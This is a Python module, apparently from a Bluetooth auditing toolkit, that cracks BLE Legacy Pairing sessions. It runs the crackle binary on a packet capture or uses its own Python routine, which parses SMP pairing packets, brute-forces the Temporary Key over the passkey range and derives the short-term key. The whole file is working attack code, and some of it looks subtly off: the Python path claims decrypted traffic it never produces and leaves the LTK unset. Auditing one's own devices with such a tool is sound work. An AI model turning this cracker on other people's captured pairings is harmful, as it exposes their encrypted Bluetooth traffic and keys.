"""
Crackle Runner — cracks BLE Legacy pairing sessions.

Two modes:
  1. Real crackle binary  — runs `crackle -i <pcap> -o <out>` subprocess
     if crackle is in PATH or at a known path.
  2. Python re-implementation — performs the same TK brute-force
     using Python's `cryptography` library (slower but portable).

crackle only works against BLE Legacy Pairing where TK can be 0 (Just Works)
or ≤ 999999 (Passkey).  LE Secure Connections (LESC) uses ECDH and is immune.

References:
  https://github.com/mikeryan/crackle
  BT Core Spec 5.4 Vol 3 Part H (SMP) — c1, s1, e() functions
"""

from __future__ import annotations

import os
import shutil
import struct
import subprocess
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, List, Optional


# ── Result model ─────────────────────────────────────────────────────────────

@dataclass
class CrackleResult:
    session_id: str
    pcap_in:    str
    pcap_out:   Optional[str]       = None
    success:    bool                = False
    tk:         Optional[int]       = None
    stk:        Optional[bytes]     = None
    ltk:        Optional[bytes]     = None
    decrypted_pcap_path: Optional[str] = None
    method:     str                 = "unknown"   # "binary" | "python"
    duration_ms: int                = 0
    error:      Optional[str]       = None
    log_lines:  List[str]           = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "session_id":           self.session_id,
            "pcap_in":              self.pcap_in,
            "pcap_out":             self.pcap_out,
            "success":              self.success,
            "tk":                   self.tk,
            "tk_hex":               f"0x{self.tk:08X}" if self.tk is not None else None,
            "stk_hex":              self.stk.hex() if self.stk else None,
            "ltk_hex":              self.ltk.hex() if self.ltk else None,
            "decrypted_pcap_path":  self.decrypted_pcap_path,
            "method":               self.method,
            "duration_ms":          self.duration_ms,
            "error":                self.error,
            "log_lines":            self.log_lines,
            "crackable_note": (
                "TK=0 (Just Works) — trivially crackable. "
                "All traffic was decrypted." if self.success and self.tk == 0
                else ("Passkey entry — brute-forced offline." if self.success and self.tk
                else None)
            ),
        }


# ── Runner ───────────────────────────────────────────────────────────────────

class CrackleRunner:
    """
    Runs crackle against legacy pairing PCAP captures.

    Usage:
        runner = CrackleRunner()
        runner.crack(
            pcap_path="/tmp/capture.pcap",
            session_id="pair_0001",
            on_result=lambda r: print(r.to_dict()),
        )
    """

    _BINARY_NAMES = ["crackle", "crackle-ble"]

    def __init__(self, output_dir: str = "/tmp/blueshield_crackle"):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
        self._binary: Optional[str] = self._find_binary()

    # ── public ───────────────────────────────────────────────────────────────

    def binary_available(self) -> bool:
        return self._binary is not None

    def crack(
        self,
        pcap_path: str,
        session_id: str = "unknown",
        on_result: Optional[Callable[[CrackleResult], None]] = None,
        passkey_max: int = 0,       # 0 = Just Works only; 999999 = full passkey range
        timeout: float = 60.0,
    ) -> threading.Thread:
        """
        Start cracking in a background thread.
        Returns the thread; on_result callback fires when done.
        """
        t = threading.Thread(
            target=self._run,
            args=(pcap_path, session_id, on_result, passkey_max, timeout),
            daemon=True,
            name=f"Crackle-{session_id}",
        )
        t.start()
        return t

    # ── internal ─────────────────────────────────────────────────────────────

    def _run(self, pcap_path, session_id, on_result, passkey_max, timeout):
        t0 = time.monotonic()
        result = CrackleResult(session_id=session_id, pcap_in=pcap_path)

        if not os.path.exists(pcap_path):
            result.error = f"PCAP file not found: {pcap_path}"
            if on_result:
                on_result(result)
            return

        out_path = os.path.join(
            self.output_dir,
            f"{session_id}_decrypted_{int(time.time())}.pcap"
        )
        result.pcap_out = out_path

        if self._binary:
            self._run_binary(result, out_path, timeout)
        else:
            self._run_python(result, out_path, passkey_max, timeout)

        result.duration_ms = int((time.monotonic() - t0) * 1000)
        if on_result:
            on_result(result)

    def _run_binary(self, result: CrackleResult, out_path: str, timeout: float) -> None:
        """Execute the real crackle binary."""
        cmd = [self._binary, "-i", result.pcap_in, "-o", out_path]
        result.method = "binary"
        result.log_lines.append(f"Running: {' '.join(cmd)}")

        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            stdout = proc.stdout or ""
            stderr = proc.stderr or ""
            output = (stdout + stderr).strip()

            for line in output.splitlines():
                result.log_lines.append(line)

            if proc.returncode == 0:
                result.success = True
                result.decrypted_pcap_path = out_path if os.path.exists(out_path) else None
                # Parse TK from output
                result.tk = self._parse_tk(output)
                result.log_lines.append(f"[OK] Cracked. TK = {result.tk}")
            else:
                result.error = f"crackle exited {proc.returncode}"

        except subprocess.TimeoutExpired:
            result.error = f"crackle timed out after {timeout}s"
        except FileNotFoundError:
            # Binary disappeared between check and run — fall through to Python
            self._run_python(result, out_path, 999999, timeout)

    def _run_python(
        self,
        result: CrackleResult,
        out_path: str,
        passkey_max: int,
        timeout: float,
    ) -> None:
        """
        Pure-Python crackle implementation.

        Implements the BLE SMP c1/s1/e() functions and brute-forces TK
        over [0, passkey_max].

        Requires: pip install cryptography
        """
        result.method = "python"
        result.log_lines.append("[Python] crackle binary not found — using Python implementation")

        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
        except ImportError:
            result.error = (
                "Neither crackle binary nor the 'cryptography' package is available. "
                "Install with: pip install cryptography"
            )
            return

        # Parse the PCAP to extract SMP material
        smp_material = self._extract_smp_from_pcap(result.pcap_in)
        if not smp_material:
            result.error = "Could not extract SMP pairing material from PCAP"
            result.log_lines.append("[Python] No SMP Confirm/Random pairs found in capture")
            return

        mconfirm = smp_material.get("mconfirm")
        sconfirm = smp_material.get("sconfirm")
        mrand    = smp_material.get("mrand")
        srand    = smp_material.get("srand")
        ia       = smp_material.get("init_addr",  bytes(7))
        ra       = smp_material.get("resp_addr",  bytes(7))
        preq     = smp_material.get("pairing_req", bytes(7))
        pres     = smp_material.get("pairing_rsp", bytes(7))

        if not all([mconfirm, sconfirm, mrand, srand]):
            result.error = "Incomplete SMP material — need Mconfirm, Sconfirm, Mrand, Srand"
            return

        result.log_lines.append(f"Mconfirm: {mconfirm.hex()}")
        result.log_lines.append(f"Sconfirm: {sconfirm.hex()}")
        result.log_lines.append(f"Mrand:    {mrand.hex()}")
        result.log_lines.append(f"Srand:    {srand.hex()}")

        def aes128(key: bytes, data: bytes) -> bytes:
            # BLE uses AES-128 in ECB mode with reversed byte order
            cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
            enc = cipher.encryptor()
            return enc.update(data) + enc.finalize()

        def ble_e(key: bytes, plaintext: bytes) -> bytes:
            # BLE e() function: swap endianness, AES, swap back
            k  = bytes(reversed(key))
            pt = bytes(reversed(plaintext))
            ct = aes128(k, pt)
            return bytes(reversed(ct))

        def c1(tk: bytes, rand: bytes, preq: bytes, pres: bytes,
               iat: int, ia: bytes, rat: int, ra: bytes) -> bytes:
            """BLE SMP c1 — compute confirm value."""
            p1 = bytes([iat, rat]) + bytes(reversed(preq)) + bytes(reversed(pres))
            p2 = bytes([0, 0, 0, 0]) + bytes(reversed(ia)) + bytes(reversed(ra))
            x  = ble_e(tk, bytes(a ^ b for a, b in zip(rand, p1)))
            return ble_e(tk, bytes(a ^ b for a, b in zip(x, p2)))

        # Extract address type flags from preq/pres
        iat = ia[6] if len(ia) > 6 else 0    # initiator address type byte
        rat = ra[6] if len(ra) > 6 else 0    # responder address type byte
        ia6 = ia[:6]
        ra6 = ra[:6]

        deadline = time.monotonic() + timeout
        max_tk = max(0, min(passkey_max, 999999))

        result.log_lines.append(f"Brute-forcing TK in range [0, {max_tk}]...")

        for tk_int in range(max_tk + 1):
            if time.monotonic() > deadline:
                result.error = "Python crackle timed out"
                return

            tk_bytes = tk_int.to_bytes(16, "big")
            # Verify Mconfirm using Mrand
            computed = c1(tk_bytes, mrand, preq, pres, iat, ia6, rat, ra6)
            if computed == mconfirm:
                # Also verify Sconfirm with Srand (double-check)
                computed_s = c1(tk_bytes, srand, preq, pres, iat, ia6, rat, ra6)
                if computed_s == sconfirm:
                    result.tk = tk_int
                    result.success = True
                    result.log_lines.append(f"[+] TK = {tk_int} (0x{tk_int:08X})")
                    if tk_int == 0:
                        result.log_lines.append("[!] Just Works pairing — TK was 0 (trivially crackable)")

                    # Derive STK = s1(TK, Srand, Mrand)
                    stk_rand = srand[:8] + mrand[:8]
                    result.stk = ble_e(tk_bytes, stk_rand)
                    result.log_lines.append(f"[+] STK = {result.stk.hex()}")

                    return

        result.error = f"TK not found in range [0, {max_tk}]"
        result.log_lines.append(f"[-] Exhausted {max_tk + 1} candidates without match")

    def _extract_smp_from_pcap(self, pcap_path: str) -> Optional[dict]:
        """
        Minimal PCAP reader to extract SMP pairing material.

        Looks for L2CAP/SMP packets on CID 0x0006.
        Returns dict with keys: mconfirm, sconfirm, mrand, srand, pairing_req, pairing_rsp, init_addr, resp_addr
        or None if extraction fails.
        """
        try:
            with open(pcap_path, "rb") as f:
                # Read global header
                magic = struct.unpack("<I", f.read(4))[0]
                if magic != 0xA1B2C3D4:
                    return None
                f.read(20)   # skip rest of global header

                material: dict = {}
                confirm_idx = 0
                random_idx  = 0

                while True:
                    rec_hdr = f.read(16)
                    if len(rec_hdr) < 16:
                        break
                    _, _, incl_len, _ = struct.unpack("<IIII", rec_hdr)
                    frame = f.read(incl_len)
                    if len(frame) < incl_len:
                        break

                    # DLT_BLUETOOTH_LE_LL_WITH_PHDR: 10-byte phdr + AA(4) + PDU
                    if len(frame) < 16:
                        continue
                    offset = 10   # skip phdr
                    # AA (4 bytes)
                    offset += 4

                    # PDU header (2 bytes): LLID | NESN | SN | MD | RFU | Length
                    if len(frame) < offset + 2:
                        continue
                    ll_hdr_b = frame[offset: offset + 2]
                    llid     = ll_hdr_b[0] & 0x03
                    ll_len   = ll_hdr_b[1] & 0xFF
                    offset  += 2

                    if llid not in (1, 2):   # only L2CAP PDUs
                        continue

                    ll_payload = frame[offset: offset + ll_len]
                    if len(ll_payload) < 5:
                        continue

                    l2cap_len, l2cap_cid = struct.unpack_from("<HH", ll_payload, 0)
                    if l2cap_cid != 0x0006:    # SMP CID
                        continue
                    if len(ll_payload) < 4 + l2cap_len:
                        continue

                    smp_data = ll_payload[4: 4 + l2cap_len]
                    if not smp_data:
                        continue

                    cmd     = smp_data[0]
                    payload = smp_data[1:]

                    if cmd == 0x01 and len(payload) >= 6:   # Pairing Request
                        material["pairing_req"] = smp_data
                    elif cmd == 0x02 and len(payload) >= 6: # Pairing Response
                        material["pairing_rsp"] = smp_data
                    elif cmd == 0x03 and len(payload) >= 16:  # Pairing Confirm
                        if confirm_idx == 0:
                            material["mconfirm"] = payload[:16]
                        else:
                            material["sconfirm"] = payload[:16]
                        confirm_idx += 1
                    elif cmd == 0x04 and len(payload) >= 16:  # Pairing Random
                        if random_idx == 0:
                            material["mrand"] = payload[:16]
                        else:
                            material["srand"] = payload[:16]
                        random_idx += 1

                return material if material else None

        except Exception as e:
            return None

    @staticmethod
    def _find_binary() -> Optional[str]:
        for name in CrackleRunner._BINARY_NAMES:
            path = shutil.which(name)
            if path:
                return path
        # Common manual install locations on Linux/Pi
        for path in ["/usr/local/bin/crackle", "/opt/crackle/crackle"]:
            if os.path.isfile(path) and os.access(path, os.X_OK):
                return path
        return None

    @staticmethod
    def _parse_tk(output: str) -> Optional[int]:
        """Parse the TK value from crackle binary stdout."""
        for line in output.splitlines():
            line = line.lower()
            if "tk" in line and ("0x" in line or "=" in line):
                # Try to find hex value
                import re
                m = re.search(r"0x([0-9a-f]+)", line)
                if m:
                    return int(m.group(1), 16)
                m = re.search(r"tk\s*=\s*(\d+)", line)
                if m:
                    return int(m.group(1))
        return None
